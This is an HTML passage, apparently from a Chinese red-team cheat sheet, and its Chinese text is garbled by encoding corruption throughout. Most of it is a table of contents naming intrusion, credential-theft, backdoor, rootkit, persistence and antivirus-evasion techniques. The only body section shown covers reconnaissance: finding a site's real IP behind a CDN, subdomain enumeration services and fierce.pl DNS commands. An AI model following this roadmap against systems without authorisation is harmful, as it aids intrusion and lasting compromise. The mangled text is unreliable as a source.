<li><a href="#%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE">ç”³è¯·ç¥¨æ®</a></li>
<li><a href="#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE">å¯¼å‡ºç¥¨æ®</a></li>
<li><a href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81">ç ´è§£å¯†ç </a></li>
<li><a href="#%E9%87%8D%E5%86%99%E7%A5%A8%E6%8D%AE">é‡å†™ç¥¨æ®</a></li>
<li><a href="#getuserspns">GetUserSPNs</a></li>
</ul>
</li>
<li><a href="#aseproasting">ASEPRoasting</a></li>
<li><a href="#pass-the-hash">PASS-THE-HASH</a><ul>
<li><a href="#wmiexec--thehash">WMIExec &amp; TheHash</a></li>
<li><a href="#wmi">WMI</a><ul>
<li><a href="#wmiexecpy">wmiexec.py</a></li>
<li><a href="#wmiexecvbs">wmiexec.vbs</a></li>
<li><a href="#powershell">Powershell</a></li>
</ul>
</li>
<li><a href="#psexec">Psexec</a></li>
<li><a href="#mimikatz">Mimikatz</a></li>
<li><a href="#pth-winexe">pth-winexe</a></li>
<li><a href="#smbexec">Smbexec</a></li>
</ul>
</li>
<li><a href="#pass-the-ticket">PASS-THE-TICKET</a><ul>
<li><a href="#%E5%90%8D%E8%AF%8D">åè¯</a></li>
<li><a href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEmimikatz">é»„é‡‘ç¥¨æ®+Mimikatz</a></li>
<li><a href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AEmimikatz">ç™½é“¶ç¥¨æ®+Mimikatz</a></li>
<li><a href="#ms14-068">MS14-068</a></li>
<li><a href="#mimikatzmsf">Mimikatz+MSF</a></li>
<li><a href="#goldenpacpy">goldenPac.py</a></li>
</ul>
</li>
<li><a href="#%E8%B4%A6%E6%88%B7%E5%A7%94%E6%B4%BE">è´¦æˆ·å§”æ´¾</a><ul>
<li><a href="#%E8%B4%A6%E6%88%B7%E9%9D%9E%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">è´¦æˆ·éå—é™å§”æ´¾</a></li>
<li><a href="#%E8%B4%A6%E6%88%B7%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">è´¦æˆ·å—é™å§”æ´¾</a></li>
</ul>
</li>
<li><a href="#%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">èµ„æºå—é™å§”æ´¾</a></li>
<li><a href="#cve-2019-0708">CVE-2019-0708</a></li>
<li><a href="#ntlm%E4%B8%AD%E7%BB%A7">NTLMä¸­ç»§</a><ul>
<li><a href="#ntlmrelayx%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">Ntlmrelayx+èµ„æºå—é™å§”æ´¾</a></li>
<li><a href="#responder">Responder</a><ul>
<li><a href="#smb%E5%8D%8F%E8%AE%AE%E6%88%AA%E8%8E%B7">SMBåè®®æˆªè·</a></li>
<li><a href="#wpad%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97">WPADä»£ç†æ¬ºéª—</a></li>
<li><a href="#web%E6%BC%8F%E6%B4%9E">Webæ¼æ´</a></li>
<li><a href="#%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB">ä¸­ç»§æ”»å‡»</a></li>
<li><a href="#ntlmv2hash%E7%A0%B4%E8%A7%A3">NTLMv2Hashç ´è§£</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#gpp-password">GPP-Password</a></li>
<li><a href="#winrm%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C">WinRMæ— æ–‡ä»¶æ‰§è¡Œ</a></li>
<li><a href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E5%91%BD%E4%BB%A4">æ·»åŠ åŸŸç®¡å‘½ä»¤</a></li>
<li><a href="#ssh%E5%AF%86%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95">SSHå¯†é’¥å…å¯†ç™»å½•</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E4%BF%9D%E5%AD%98%E7%9A%84rdp%E5%AF%86%E7%A0%81">è·å–ä¿å­˜çš„RDPå¯†ç </a></li>
</ul>
</li>
<li><a href="#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96">åé—¨&amp;æŒä¹…åŒ–</a><ul>
<li><a href="#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7">å½±å­ç”¨æˆ·</a></li>
<li><a href="#rid%E5%8A%AB%E6%8C%81">RIDåŠ«æŒ</a></li>
<li><a href="#guest%E6%BF%80%E6%B4%BB">Guestæ¿€æ´»</a></li>
<li><a href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81">æ˜ åƒåŠ«æŒ</a><ul>
<li><a href="#sethc">Sethc</a></li>
<li><a href="#%E8%BD%BB%E6%9D%BE%E4%BD%BF%E7%94%A8">è½»æ¾ä½¿ç”¨</a></li>
<li><a href="#ifeo%E9%9D%99%E9%BB%98%E6%89%A7%E8%A1%8C">IFEOé™é»˜æ‰§è¡Œ</a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9">æ³¨å†Œè¡¨å¯åŠ¨é¡¹</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#cmd">CMD</a></li>
</ul>
</li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">è®¡åˆ’ä»»åŠ¡</a><ul>
<li><a href="#%E5%8A%A0%E8%BD%BDpowershell">åŠ è½½powershell</a></li>
<li><a href="#%E6%89%A7%E8%A1%8Cexe">æ‰§è¡Œexe</a></li>
</ul>
</li>
<li><a href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5">è¿›ç¨‹æ³¨å…¥</a><ul>
<li><a href="#appcertdlls">AppCertDlls</a></li>
<li><a href="#appinit_dlls">AppInit_DLLs</a></li>
<li><a href="#msf">MSF</a></li>
</ul>
</li>
<li><a href="#%E7%99%BB%E5%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96">ç™»å½•åˆå§‹åŒ–</a><ul>
<li><a href="#%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F">å±å¹•ä¿æŠ¤ç¨‹åº</a></li>
</ul>
</li>
<li><a href="#mof">MOF</a></li>
<li><a href="#winrm%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8">WinRMç«¯å£å¤ç”¨</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1">åˆ›å»ºæœåŠ¡</a></li>
<li><a href="#bitadmin">Bitadmin</a></li>
<li><a href="#clr-injection">CLR Injection</a></li>
<li><a href="#com-object-hijacking">COM OBJECT hijacking</a><ul>
<li><a href="#caccpropservicesclass-and-mmdeviceenumerato">CAccPropServicesClass and MMDeviceEnumerato</a></li>
<li><a href="#explorer">Explorer</a></li>
</ul>
</li>
<li><a href="#squibledoo">Squibledoo</a></li>
<li><a href="#dll%E5%8A%AB%E6%8C%81">DLLåŠ«æŒ</a><ul>
<li><a href="#%E5%8A%AB%E6%8C%811">åŠ«æŒ1</a></li>
<li><a href="#%E5%8A%AB%E6%8C%812">åŠ«æŒ2</a></li>
<li><a href="#msdtc%E6%9C%8D%E5%8A%A1%E5%8A%AB%E6%8C%81">MSDTCæœåŠ¡åŠ«æŒ</a></li>
<li><a href="#rattler">Rattler</a></li>
</ul>
</li>
<li><a href="#dll%E4%BB%A3%E7%90%86%E5%8A%AB%E6%8C%81%E5%8F%B3%E9%94%AE">DLLä»£ç†åŠ«æŒå³é”®</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8amsi%E6%89%AB%E6%8F%8F%E6%8E%A5%E5%8F%A3%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90">ä½¿ç”¨AMSIæ‰«ææ¥å£ç»´æŒæƒé™</a></li>
<li><a href="#dll%E5%8A%AB%E6%8C%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">DLLåŠ«æŒè®¡åˆ’ä»»åŠ¡</a></li>
<li><a href="#dll%E6%B3%A8%E5%85%A5">DLLæ³¨å…¥</a><ul>
<li><a href="#powershell">Powershell</a></li>
<li><a href="#injectproc">InjectProc</a></li>
</ul>
</li>
<li><a href="#%E9%80%9A%E8%BF%87%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E5%8A%A0%E8%BD%BD%E9%A1%B9%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90">é€šè¿‡æ§åˆ¶é¢æ¿åŠ è½½é¡¹ç»´æŒæƒé™</a></li>
<li><a href="#%E9%80%9A%E8%BF%87%E8%87%AA%E5%AE%9A%E4%B9%89net%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%BF%9B%E8%A1%8CDLL%E6%B3%A8%E5%85%A5">é€šè¿‡è‡ªå®šä¹‰.netåƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡ŒDLLæ³¨å…¥</a></li>
<li><a href="#windows-fax-dll-injection">Windows FAX DLL Injection</a></li>
<li><a href="#dsrm%E6%B3%A8%E5%86%8C%E8%A1%A8acl%E5%90%8E%E9%97%A8">DSRM+æ³¨å†Œè¡¨ACLåé—¨</a></li>
<li><a href="#dcshadowsid-history">DCShadow&amp;SID History</a></li>
<li><a href="#dcsync%E5%90%8E%E9%97%A8">DCSyncåé—¨</a></li>
<li><a href="#netsh-helper-dll">Netsh Helper DLL</a><ul>
<li><a href="#msfvenom%E7%94%9F%E6%88%90dll">MSFvenomç”ŸæˆDLL</a></li>
<li><a href="#msfweb_delivery">MSF+web_delivery</a></li>
<li><a href="#msfshellcode">MSF&amp;Shellcode</a></li>
</ul>
</li>
<li><a href="#mssql%E5%90%8E%E9%97%A8">MSSQLåé—¨</a></li>
<li><a href="#nssm">NSSM</a></li>
<li><a href="#%E6%B7%BB%E5%8A%A0%E7%AD%BE%E5%90%8D">æ·»åŠ ç­¾å</a></li>
<li><a href="#metsvc">Metsvc</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#hookpasswordchangenotify">HookPasswordChangeNotify</a></li>
<li><a href="#nppspy%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81">NPPSpyè®°å½•å¯†ç </a></li>
<li><a href="#password-filter-dll">Password Filter DLL</a></li>
<li><a href="#wmic%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85">WMICäº‹ä»¶è®¢é˜…</a></li>
<li><a href="#wmi-persistence">WMI-Persistence</a></li>
<li><a href="#invoke-tasksbackdoor">Invoke-Tasksbackdoor</a></li>
<li><a href="#invoke-adsbackdoor">Invoke-ADSBackdoor</a></li>
<li><a href="#ads%E9%9A%90%E8%97%8Fwebshell">ADSéšè—webshell</a></li>
<li><a href="#adsjavascript">ADS&amp;JavaScript</a></li>
<li><a href="#empire">Empire</a><ul>
<li><a href="#lnk%E5%90%8E%E9%97%A8">LNKåé—¨</a></li>
<li><a href="#wmi">WMI</a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E5%85%A5ssp%E8%A2%AB%E5%8A%A8%E6%94%B6%E9%9B%86%E5%AF%86%E7%A0%81">æ³¨å…¥SSPè¢«åŠ¨æ”¶é›†å¯†ç </a><ul>
<li><a href="#mimikatz">Mimikatz</a></li>
<li><a href="#empire">Empire</a></li>
<li><a href="#powersploit">Powersploit</a></li>
</ul>
</li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E5%9F%9F%E7%AD%96%E7%95%A5%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E5%90%8E%E9%97%A8">åŸºäºåŸŸç­–ç•¥æ–‡ä»¶æƒé™åé—¨</a></li>
<li><a href="#kerberoasting%E5%90%8E%E9%97%A8">Kerberoastingåé—¨</a></li>
<li><a href="#s4u2self%E5%90%8E%E9%97%A8">S4U2Selfåé—¨</a></li>
<li><a href="#%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE%E5%90%8E%E9%97%A8">å—é™å§”æ´¾åé—¨</a></li>
<li><a href="#skeleton-key%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99">Skeleton Keyä¸‡èƒ½é’¥åŒ™</a></li>
<li><a href="#%E5%94%AF%E4%B8%80ip%E8%AE%BF%E9%97%AE">å”¯ä¸€IPè®¿é—®</a></li>
<li><a href="#linux-cron%E5%90%8E%E9%97%A8">Linux cronåé—¨</a></li>
<li><a href="#strace%E8%AE%B0%E5%BD%95ssh%E5%AF%86%E7%A0%81">Straceè®°å½•sshå¯†ç </a></li>
<li><a href="#sshd%E5%90%8E%E9%97%A8">SSHDåé—¨</a></li>
<li><a href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5">è¿›ç¨‹æ³¨å…¥</a></li>
<li><a href="#ssh-wrapper%E5%90%8E%E9%97%A8">SSH wrapperåé—¨</a></li>
<li><a href="#suid-shell">SUID Shell</a></li>
<li><a href="#ssh%E5%85%AC%E7%A7%81%E9%92%A5%E7%99%BB%E5%BD%95">SSHå…¬ç§é’¥ç™»å½•</a></li>
<li><a href="#reptile">Reptile</a></li>
<li><a href="#kbeast_rootkit">Kbeast_rootkit</a></li>
<li><a href="#openssh%E5%90%8E%E9%97%A8">OpenSSHåé—¨</a></li>
<li><a href="#iptables%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8">IPTablesç«¯å£å¤ç”¨</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">æ–‡ä»¶å¤„ç†</a></li>
<li><a href="#iis_bin_backdoor">IIS_Bin_Backdoor</a></li>
<li><a href="#iis_netdll_spy">IIS_NETDLL_Spy</a></li>
<li><a href="#iis_raid">IIS_RAID</a></li>
<li><a href="#java-web-backdoor">JAVA Web Backdoor</a></li>
<li><a href="#tomcat-jsp-hideshell">Tomcat JSP HideShell</a></li>
<li><a href="#apache-module%E5%90%8E%E9%97%A81">Apache Moduleåé—¨1</a></li>
<li><a href="#apache-module%E5%90%8E%E9%97%A82">Apache Moduleåé—¨2</a></li>
<li><a href="#apache-module%E5%90%8E%E9%97%A83">Apache Moduleåé—¨3</a></li>
<li><a href="#nginx-lua%E5%90%8E%E9%97%A8">Nginx Luaåé—¨</a></li>
<li><a href="#pwnnginx">PwnNginx</a></li>
</ul>
</li>
</ul>
</li>
<li><p><a href="#%E6%B8%97%E9%80%8F%E5%92%8C%E7%BA%A2%E9%98%9Ftips">æ¸—é€å’Œçº¢é˜Ÿtips</a></p>
<ul>
<li><a href="#%E7%88%B6%E8%BF%9B%E7%A8%8B%E7%A0%B4%E5%9D%8F">çˆ¶è¿›ç¨‹ç ´å</a></li>
<li><a href="#lot%E9%AB%98%E9%A2%91%E7%8E%87%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81">loTé«˜é¢‘ç‡è´¦æˆ·å¯†ç </a></li>
<li><a href="#bypass-mod_security">Bypass mod_security</a></li>
<li><a href="#%E6%9F%A5%E6%89%BEgit%E5%92%8Csvn%E7%9A%84%E5%AD%97%E5%85%B8">æŸ¥æ‰¾gitå’Œsvnçš„å­—å…¸</a></li>
<li><a href="#top-25-%E9%87%8D%E5%AE%9A%E5%90%91dorks">Top 25 é‡å®šå‘dorks</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8grep%E5%BF%AB%E9%80%9F%E5%8E%BB%E9%99%A4%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE">ä½¿ç”¨grepå¿«é€Ÿå»é™¤åƒåœ¾æ•°æ®</a></li>
<li><a href="#%E5%B7%B2%E6%B3%84%E9%9C%B2%E7%9A%84%E5%AF%86%E7%A0%81%E6%95%B4%E7%90%86%E5%87%BA%E7%9A%84%E5%AD%97%E5%85%B8">å·²æ³„éœ²çš„å¯†ç æ•´ç†å‡ºçš„å­—å…¸</a></li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5bypass">å‘½ä»¤æ³¨å…¥Bypass</a></li>
<li><a href="#%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8heartbleed%E6%BC%8F%E6%B4%9E">æŸ¥è¯¢æ˜¯å¦å­˜åœ¨heartbleedæ¼æ´</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6">è¿œç¨‹è§£å‹æ–‡ä»¶</a></li>
<li><a href="#top25-ssrf-dorks">Top25 ssrf dorks</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8securitytrails-api%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D">ä½¿ç”¨SecurityTrails APIæŸ¥è¯¢å­åŸŸå</a></li>
<li><a href="#%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80payload">é‚®ä»¶åœ°å€payload</a></li>
<li><a href="#web-server%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%91%BD%E4%BB%A4">Web serveræ—¥å¿—åˆ†æå‘½ä»¤</a></li>
<li><a href="#bypass-amsi">Bypass AMSI</a></li>
<li><a href="#bypass-amsi-2">Bypass AMSI 2</a></li>
<li><a href="#cve-2020-5902">CVE-2020-5902</a></li>
<li><a href="#%E4%B8%80%E4%BA%9B%E5%8F%AF%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E6%89%A7%E8%A1%8C">ä¸€äº›å¯å°è¯•ç»•è¿‡ç™½åå•çš„æ‰§è¡Œ</a></li>
<li><a href="#%E7%BB%95%E8%BF%87lsa-protection">ç»•è¿‡lsa protection</a></li>
<li><a href="#pezor%E5%85%8D%E6%9D%80">Pezorå…æ€</a></li>
<li><a href="#%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E9%80%BB%E8%BE%91">åŠ¨æ€è°ƒç”¨è¿›ç¨‹æ³¨å…¥é€»è¾‘</a></li>
<li><a href="#%E5%9C%A8windows-server-2016%E5%92%8C2019%E4%B8%AD%E7%BB%95%E8%BF%87windows-defender">åœ¨Windows Server 2016å’Œ2019ä¸­ç»•è¿‡Windows Defender</a></li>
<li><a href="#%E5%86%85%E5%AD%98%E4%B8%AD%E8%A7%A3%E7%A0%81shellcode%E7%BB%95%E8%BF%87av">å†…å­˜ä¸­è§£ç shellcodeç»•è¿‡av</a></li>
<li><a href="#cshot-shellcode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8">cshot shellcodeè¿œç¨‹åŠ è½½å™¨</a></li>
<li><a href="#thinkphp%E6%B8%97%E9%80%8F%E6%89%8B%E6%AE%B5">thinkphpæ¸—é€æ‰‹æ®µ</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8windows-defender%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6">ä½¿ç”¨windows defenderä¸‹è½½æ–‡ä»¶</a></li>
<li><a href="#powershell%E8%84%9A%E6%9C%AC%E6%B7%B7%E6%B7%86%E7%BB%95%E8%BF%87amsi%E5%92%8Cav">Powershellè„šæœ¬æ··æ·†ç»•è¿‡amsiå’Œav</a></li>
<li><a href="#%E9%80%9A%E8%BF%87%E6%8C%82%E8%B5%B7eventLog%E6%9C%8D%E5%8A%A1%E7%BA%BF%E7%A8%8B%E7%A6%81%E7%94%A8windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97">é€šè¿‡æŒ‚èµ·EventLogæœåŠ¡çº¿ç¨‹ç¦ç”¨Windowsäº‹ä»¶æ—¥å¿—</a></li>
<li><a href="#dedecms">dedecms</a></li>
<li><a href="#dedecms%E5%89%8D%E5%8F%B0%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81">dedecmså‰å°é‡ç½®ä»»æ„ç®¡ç†å‘˜å¯†ç </a></li>
<li><a href="#shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Shiro rememberMeååºåˆ—åŒ–æ¼æ´</a></li>
<li><a href="#shiro-padding-oracle-attack">Shiro Padding Oracle Attack</a></li>
<li><a href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87">shiroæƒé™ç»•è¿‡</a></li>
<li><a href="#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E">ç¼–è¾‘å™¨æ¼æ´</a></li>
<li><a href="#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEphpmyadmin">å®å¡”é¢æ¿æœªæˆæƒè®¿é—®phpmyadmin</a></li>
<li><a href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D">æ·±ä¿¡æœ</a></li>
<li><a href="#%E4%BB%8Elfi%E5%88%B0rce">ä»LFIåˆ°RCE</a></li>
<li><a href="#%E9%9A%90%E8%97%8Fwindows%E6%9C%8D%E5%8A%A1">éšè—windowsæœåŠ¡</a><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2>ç«™ç‚¹æ³¨å†Œäººæ³¨å†Œè¿‡çš„å…¶ä»–ç½‘ç«™(å¯¹æ³¨å†Œäººã€é‚®ç®±ã€ç”µè¯çš„åæŸ¥)ï¼Œå¯¹æŸ¥åˆ°çš„ç«™ç‚¹çš„æ·±å…¥<h2 id="ç½‘ç«™IP"><a href="#ç½‘ç«™IP" class="headerlink" title="ç½‘ç«™IP"></a>ç½‘ç«™IP</h2><h3 id="æ˜¯å¦å­˜åœ¨CDN"><a href="#æ˜¯å¦å­˜åœ¨CDN" class="headerlink" title="æ˜¯å¦å­˜åœ¨CDN"></a>æ˜¯å¦å­˜åœ¨CDN</h3>Pingã€å¤šåœ°pingã€å›½å¤–ping<h3 id="Bypass-cdnå¸¸è§„æ–¹å¼"><a href="#Bypass-cdnå¸¸è§„æ–¹å¼" class="headerlink" title="Bypass cdnå¸¸è§„æ–¹å¼"></a>Bypass cdnå¸¸è§„æ–¹å¼</h3>å­åŸŸå<br><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br>Pingæ ¹åŸŸå<br>Nslookup<br>Cloudflareçš„çœŸå®IPå¯»æ‰¾<br><a target="_blank" rel="noopener" href="http://crimeflare.org:82/cfs.html">http://crimeflare.org:82/cfs.html</a><br><a target="_blank" rel="noopener" href="https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py">https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py</a><br>æŸ¥æ‰¾è€åŸŸå<br>æŸ¥æ‰¾å…³è”åŸŸå<br><a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br><a target="_blank" rel="noopener" href="http://www.baidu.cn/">www.baidu.cn</a><br><a target="_blank" rel="noopener" href="http://www.baidu.org/">www.baidu.org</a><br><a target="_blank" rel="noopener" href="http://www.baidu.xyzç­‰ç­‰/">www.baidu.xyzç­‰ç­‰</a><br>ä¿¡æ¯æ³„éœ²/é…ç½®æ–‡ä»¶<br>Phpinfo<br>ç½‘é¡µæºç <br>Svn<br>Github<br>Shodan/fofa/zoomeye<br>SSLè¯ä¹¦è®°å½•<br><a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a><br>ç½‘ç«™æ¼æ´<br>Xss<br>Ssrf<br>å‘½ä»¤æ‰§è¡Œ<br>SQLæ³¨å…¥(æŸç§æƒ…å†µloadfileè¯»å–linuxçš„ipé…ç½®æ–‡ä»¶ï¼Œhostsæ–‡ä»¶ç­‰)<br>DNSè®°å½•ï¼Œè¯ä¹¦è®°å½•<br>è®¾ç½®xff/x-remote-ip/x-remote-addrä¸º127.0.0.1/æˆ–ipv6åœ°å€<br>RSSè®¢é˜…/é‚®ä»¶å¤´<br>APPåç¼–è¯‘æœç´¢/æˆªå–APPçš„è¯·æ±‚ä¿¡æ¯<br>ä¿®æ”¹hostsæ–‡ä»¶æŒ‡å‘<h2 id="åŸŸåå†å²IP"><a href="#åŸŸåå†å²IP" class="headerlink" title="åŸŸåå†å²IP"></a>åŸŸåå†å²IP</h2><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><h2 id="ç½‘ç«™æ¶æ„-æœåŠ¡å™¨æŒ‡çº¹-CMSè¯†åˆ«-å®¹å™¨"><a href="#ç½‘ç«™æ¶æ„-æœåŠ¡å™¨æŒ‡çº¹-CMSè¯†åˆ«-å®¹å™¨" class="headerlink" title="ç½‘ç«™æ¶æ„/æœåŠ¡å™¨æŒ‡çº¹/CMSè¯†åˆ«/å®¹å™¨"></a>ç½‘ç«™æ¶æ„/æœåŠ¡å™¨æŒ‡çº¹/CMSè¯†åˆ«/å®¹å™¨</h2>Whatweb<br>ç½‘é¡µæºä»£ç <br>è¯·æ±‚å¤´/å“åº”å¤´<br>ç½‘ç«™åº•éƒ¨ï¼Œé¡¶éƒ¨ï¼Œå·¦ä¸Šè§’å³ä¸Šè§’<br>ç½‘ç«™æŠ¥é”™ä¿¡æ¯<br><a target="_blank" rel="noopener" href="http://www.yunsee.cn/">http://www.yunsee.cn/</a><br>åŸŸå/install<br>Firefoxæ’ä»¶Wappalyzer<br>CMSæ¼æ´<br>å®šä½ç‰ˆæœ¬å¯¹åº”å·²çŸ¥æ¼æ´æ£€æŸ¥<br>CMSæœªçŸ¥æ¼æ´æŒ–æ˜<br>Webå®¹å™¨å·²çŸ¥æ¼æ´(è§£ææ¼æ´è¿™ç§)<br>æ˜¾ç¤ºç½‘ç«™ä½¿ç”¨çš„æŠ€æœ¯<br><a target="_blank" rel="noopener" href="https://builtwith.com/">https://builtwith.com/</a><br>ä¸­é—´ä»¶ã€ç»„ä»¶<br>Weblogicã€tomcatã€zabbixã€strutsã€axisç­‰<br><a target="_blank" rel="noopener" href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness</a><h2 id="å­åŸŸå"><a href="#å­åŸŸå" class="headerlink" title="å­åŸŸå"></a>å­åŸŸå</h2>è€ç«™ã€åŒæ ·æ¶æ„æˆ–åŒæºç çš„å­ç«™<br>çˆ†ç ´ï¼Œæ¥å£æŸ¥è¯¢<br><a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br><a target="_blank" rel="noopener" href="https://d.chinacycc.com/index.php?m=Login&amp;a=index">https://d.chinacycc.com/index.php?m=Login&amp;a=index</a><br>subDomainBruteã€knockpy<br>OWAå‘ç°ã€dig adfsã€dig mail<br><a target="_blank" rel="noopener" href="https://dns.bufferover.run/dns?q=baidu.com">https://dns.bufferover.run/dns?q=baidu.com</a><br><a target="_blank" rel="noopener" href="http://api.hackertarget.com/reversedns/?q=target.com">http://api.hackertarget.com/reversedns/?q=target.com</a><h2 id="ç½‘ç«™ä½¿ç”¨çš„CMSçš„å®˜æ–¹demoç«™"><a href="#ç½‘ç«™ä½¿ç”¨çš„CMSçš„å®˜æ–¹demoç«™" class="headerlink" title="ç½‘ç«™ä½¿ç”¨çš„CMSçš„å®˜æ–¹demoç«™"></a>ç½‘ç«™ä½¿ç”¨çš„CMSçš„å®˜æ–¹demoç«™</h2>æ‰¾ä¸åˆ°demoå°±æ‰¾æºç å¼€å‘è€…ï¼ŒåŠ ç¾¤ä»€ä¹ˆçš„ï¼Œç»“åˆç¤¾ä¼šå·¥ç¨‹å­¦è¦ä¸ªåå°æˆªå›¾(å¯¹äºä¸€äº›åå°ç›®å½•å¤æ‚çš„cms)ï¼Œæ³¨æ„çœ‹ç½‘ç«™ä¸Šä¸€äº›åŠŸèƒ½ä»‹ç»çš„æˆªå›¾ã€‚<h2 id="SSLè¯ä¹¦ä¿¡æ¯"><a href="#SSLè¯ä¹¦ä¿¡æ¯" class="headerlink" title="SSLè¯ä¹¦ä¿¡æ¯"></a>SSLè¯ä¹¦ä¿¡æ¯</h2><a target="_blank" rel="noopener" href="https://crt.sh/?q=%25.target.com">https://crt.sh/?q=%25.target.com</a><br><a target="_blank" rel="noopener" href="https://censys.io/certificates?q=target.com">https://censys.io/certificates?q=target.com</a><br><a target="_blank" rel="noopener" href="https://github.com/cheetz/sslScrape">https://github.com/cheetz/sslScrape</a><h2 id="DNSå†å²è§£æè®°å½•"><a href="#DNSå†å²è§£æè®°å½•" class="headerlink" title="DNSå†å²è§£æè®°å½•"></a>DNSå†å²è§£æè®°å½•</h2><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a><br><a target="_blank" rel="noopener" href="https://securitytrails.com/">https://securitytrails.com/</a><br>åŸŸä¼ é€æ¼æ´æ£€æŸ¥<br>Dnsenumã€fierce<br><a target="_blank" rel="noopener" href="http://ha.ckers.org/fierce/">http://ha.ckers.org/fierce/</a><br>$ ./fierce.pl -dns example.com<br>$ ./fierce.pl â€“dns example.com â€“wordlist myWordList.txt<blockquote>
